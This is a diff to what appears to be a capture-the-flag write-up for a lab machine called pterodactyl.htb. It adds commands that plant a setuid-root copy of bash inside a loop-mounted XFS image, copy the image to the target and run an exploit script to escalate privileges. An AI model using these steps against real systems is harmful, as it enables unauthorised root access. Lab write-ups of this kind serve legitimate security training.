@@ -421,6 +421,27 @@ mkdir -p /tmp/mnt
 mount -o loop,suid xfs.img /tmp/mnt
 cp /tmp/bash /tmp/mnt/xpl
 chmod 4755 /tmp/mnt/xpl
-
+chown root:root /tmp/mnt/xpl
+chmod 4755 /tmp/mnt/xpl
+umount /tmp/mnt
+gzip xfs.img
+scp xfs.img.gz phileasfogg3@pterodactyl.htb:/tmp/
 ```
 
+Now we want to log back into the pteradactyl machine:
+
+```
+ssh phileasfogg3@pterodactyl.htb
+```
+
+And now we want to gunzip the xfs.img.gz file:
+
+```
+gunzip /tmp/xfs.img.gz
+```
+
+Finally, we want to run exploit.sh, like so:
+
+```
+./exploit.sh -e xfs.img
+```
